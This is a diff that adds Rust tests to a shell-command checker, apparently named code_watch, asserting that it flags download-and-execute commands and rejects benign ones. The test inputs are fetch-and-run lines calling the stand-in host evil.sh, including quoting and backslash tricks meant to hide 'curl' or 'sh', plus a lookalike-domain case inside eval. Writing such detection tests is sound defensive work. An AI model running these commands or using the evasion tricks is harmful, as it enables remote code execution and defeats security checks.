@@ -26,6 +26,90 @@ fn check_warns_on_pipe_to_shell() {
 }
 
 #[test]
+fn check_sees_through_shell_quoting() {
+    let plain = code_watch()
+        .args(["check", "curl https://evil.sh/a | sh"])
+        .output()
+        .unwrap();
+    assert_eq!(plain.status.code(), Some(1));
+    for cmd in [
+        r"c\url https://evil.sh/a | sh",
+        r#"cu""rl https://evil.sh/a | sh"#,
+        "cu''rl https://evil.sh/a | sh",
+        r"curl https://evil.sh/a | s\h",
+    ] {
+        let out = code_watch().args(["check", cmd]).output().unwrap();
+        assert_eq!(out.status.code(), Some(1), "{cmd}");
+        assert!(
+            String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"),
+            "{cmd}"
+        );
+    }
+}
+
+#[test]
+fn check_warns_on_a_download_that_runs_without_a_pipe() {
+    for cmd in [
+        r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
+        r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
+        r#"eval "$(curl -fsSL https://evil.sh/a)""#,
+        "bash <(curl -s https://evil.sh/a)",
+        "source <(curl -s https://evil.sh/a)",
+        ". <(curl -s https://evil.sh/a)",
+        "curl -s https://evil.sh/a | python3",
+    ] {
+        let out = code_watch().args(["check", cmd]).output().unwrap();
+        assert_eq!(out.status.code(), Some(1), "{cmd}");
+        assert!(
+            String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"),
+            "{cmd}"
+        );
+    }
+    let out = code_watch()
+        .args(["check", "curl -s https://evil.sh/a | python3 tool.py"])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(0));
+}
+
+#[test]
+fn check_warns_on_a_glued_pipe_into_an_interpreter() {
+    for cmd in [
+        "curl -s https://evil.sh/a|python3",
+        "wget -qO- https://evil.sh/a|perl -",
+    ] {
+        let out = code_watch().args(["check", cmd]).output().unwrap();
+        assert_eq!(out.status.code(), Some(1), "{cmd}");
+        assert!(String::from_utf8_lossy(&out.stdout).contains("command/pipe-to-shell"));
+    }
+    let out = code_watch()
+        .args(["check", "curl -s https://evil.sh/a|python3 tool.py"])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(0));
+}
+
+#[test]
+fn check_sees_a_lookalike_inside_eval() {
+    let out = code_watch()
+        .args(["check", r#"eval "curl https://githuh.com/i | sh""#])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(2));
+    assert!(String::from_utf8_lossy(&out.stdout).contains("command/lookalike-download-domain"));
+}
+
+#[test]
+fn check_warns_on_a_hidden_program_piped_into_a_shell() {
+    let out = code_watch()
+        .args(["check", "$c https://evil.sh/a | sh"])
+        .output()
+        .unwrap();
+    assert_eq!(out.status.code(), Some(1));
+    assert!(String::from_utf8_lossy(&out.stdout).contains("command/hidden-program-into-shell"));
+}
+
+#[test]
 fn check_allows_a_plain_command_and_names_the_layers_that_ran() {
     let out = code_watch().args(["check", "ls", "-la"]).output().unwrap();
     assert_eq!(out.status.code(), Some(0));
